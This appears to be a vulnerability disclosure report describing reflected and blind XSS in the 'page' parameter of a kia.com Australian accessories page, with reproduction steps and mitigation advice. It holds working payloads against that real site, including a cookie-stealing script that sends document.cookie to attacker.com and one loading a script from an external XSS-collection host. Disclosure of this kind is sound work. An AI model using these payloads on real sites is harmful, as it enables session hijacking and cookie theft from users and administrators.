Summary

A vulnerability exists in the kia.com domain , leading to both reflected and blind XSS attacks. This allows an attacker to execute arbitrary JavaScript in the context of the victim's browser, potentially leading to session hijacking, defacement, or other malicious activities.

Vulnerable endpoint
https://www.kia.com/au/cars/ev9/accessories.html?page=

DESCRIPTION :

Reflected XSS

The page parameter is reflected directly in the HTML response without proper sanitization. An attacker can craft a malicious URL that includes JavaScript code, which will be executed when the victim visits the URL.

Steps to Reproduce

1. Navigate to the following URL
https://www.kia.com/au/cars/ev9/accessories.html?page=

2. Enter the payload
"><image src =q onerror=prompt(document.cookie)>

payload attached link : https://www.kia.com/au/cars/ev9/accessories.html?page="><image src =q onerror=prompt(document.cookie)>

3. Observe that the payload is triggered

Blind XSS

The page parameter also affects backend systems that handle or log this data without proper sanitization. When the backend processes the malicious input, it executes the injected JavaScript in the context of an administrator's browser, if they view the logs or data.

Steps to Reproduce

1. Submit the following payload in the parameter:
"><script>new Image().src='http://attacker.com/log?cookie='+document.cookie;</script>

my payload : '"><script src=https://xss.report/c/wedohacks></script>

The payload is stored and later viewed by an administrator or user with access to the backend system.

Impact

Reflected XSS: Immediate execution of malicious JavaScript in the context of the user's browser.
Blind XSS: Execution of malicious JavaScript in the context of an administrator or privileged user's browser, leading to potential compromise of their session and privileges.

Mitigation

To prevent these vulnerabilities:

Sanitize User Input: Ensure that all user-supplied data is properly sanitized before being included in the HTML response or backend systems.
Use Contextual Output Encoding: Apply proper encoding based on the context where the data is inserted (e.g., HTML, JavaScript, URL).
